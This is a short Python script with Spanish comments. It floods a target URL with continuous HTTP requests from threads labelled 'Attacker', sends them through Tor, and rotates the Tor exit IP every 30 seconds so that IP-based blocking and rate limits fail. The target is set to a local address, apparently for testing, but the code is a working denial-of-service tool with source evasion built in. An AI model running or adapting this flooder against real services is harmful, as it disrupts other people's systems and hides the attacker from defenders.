import requests
import threading
import time
from stem import Signal
from stem.control import Controller

TARGET_URL = 'http://127.0.0.1:5000/ping'
NUM_THREADS = 1  # Puedes ajustar este número
ROTATE_INTERVAL = 30  # Intervalo en segundos para rotar IPs
TOR_PASSWORD = 'tor123' 

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

def rotate_tor_ip():
    try: 
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password=TOR_PASSWORD)
            controller.signal(Signal.NEWNYM)
            print("IP de Tor rotada")
    except Exception as e:
        print(f"Error al rotar IP de Tor: {e}")


def attack():
    while True:
        try:
            response = requests.get(TARGET_URL, proxies=proxies, timeout=5)
            print(f"[{threading.current_thread().name}] Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print(f" [{threading.current_thread().name}] Server not responding")


# Hilo para rotar la IP de Tor cada cierto tiempo
def rotator():
    while True:
        rotate_tor_ip()
        time.sleep(ROTATE_INTERVAL)

threads = []

t_rot = threading.Thread(target=rotator)
t_rot.daemon = True
threads.append(t_rot)
t_rot.start()


for i in range(NUM_THREADS):
    t = threading.Thread(target=attack, name=f"Attacker-{i}")
    t.daemon = True
    threads.append(t)
    t.start()

for t in threads:
    t.join()